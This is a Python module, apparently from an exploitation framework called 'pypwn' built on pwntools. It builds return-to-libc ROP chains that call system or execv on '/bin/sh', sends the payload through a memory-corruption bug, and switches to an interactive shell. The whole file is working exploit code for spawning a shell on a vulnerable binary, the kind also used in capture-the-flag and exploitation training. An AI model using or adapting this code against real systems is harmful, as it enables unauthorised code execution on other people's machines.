import enum
import typing
from pypwn.core.abstract.module import AbstractModule
from pypwn.core.abstract.process import AbstractProcess
from pypwn.core.protocols import IRop, ITarget, ILibc
from pwn import p64
from loguru import logger


class ExecMethod(enum.Enum):
    SYSTEM = enum.auto()
    EXECV = enum.auto()


class ExecShell(AbstractModule):
    class __TargetType(ITarget, ILibc, IRop): ...

    @classmethod
    def execute(cls, target: __TargetType,
                process: AbstractProcess,
                method: ExecMethod = ExecMethod.SYSTEM,
                offset: int = 0, leave: bool = False, canary: int | None = None,
                *args, **kwargs) -> typing.Any:
        logger.info(f"Running {cls.__name__} module")
        logger.info("Looking for /bin/sh in the executable")

        bin_sh_ptr = target.libc.find_string(b'/bin/sh\0')
        if bin_sh_ptr is None:
            logger.critical(f"Failed to find /bin/sh in libc")
            return None

        if method == ExecMethod.SYSTEM:
            rop_chain = cls._system(target, bin_sh_ptr)
        elif method == ExecMethod.EXECV:
            rop_chain = cls._execv(target, bin_sh_ptr)
        else:
            logger.critical("Unknown execution method selected")
            return None

        payload = target.generate_payload(rop_chain, offset, leave, canary)

        logger.info(f"Sending payload. Payload size = {hex(len(payload))}")
        process(payload)

        logger.success(f"Switching to interactive mode")
        process.interactive()
        return True

    @classmethod
    def _system(cls, target: __TargetType, bin_sh_ptr: int):
        system_ptr = target.libc.find_symbol("system")
        if system_ptr is None:
            logger.critical(f"Failed to find system in libc")
            return None

        pop_rdi = target.rop.pop_rdi
        ret = target.rop.ret

        logger.info(f"pop rdi gadget: {hex(pop_rdi)}")
        logger.info(f"'/bin/sh' ptr {hex(bin_sh_ptr)}")
        logger.info(f"system ptr {hex(system_ptr)}")

        return p64(ret) + p64(pop_rdi) + p64(bin_sh_ptr) + p64(system_ptr)

    @classmethod
    def _execv(cls, target: __TargetType, bin_sh_ptr: int):
        execv_ptr = target.libc.find_symbol("execv")
        if execv_ptr is None:
            logger.critical(f"Failed to find execv in libc")
            return None

        pop_rdi = target.rop.pop_rdi
        ret = target.rop.ret
        pop_rsi = target.rop.find(['pop rsi', 'pop r15', 'ret'])

        logger.info(f"pop rdi gadget: {hex(pop_rdi)}")
        logger.info(f"pop rsi gadget: {hex(pop_rsi)}")
        logger.info(f"'/bin/sh' ptr {hex(bin_sh_ptr)}")
        logger.info(f"execv ptr {hex(execv_ptr)}")

        return p64(ret) + p64(pop_rdi) + p64(bin_sh_ptr) + p64(pop_rsi) + p64(0) + p64(0) + p64(execv_ptr)
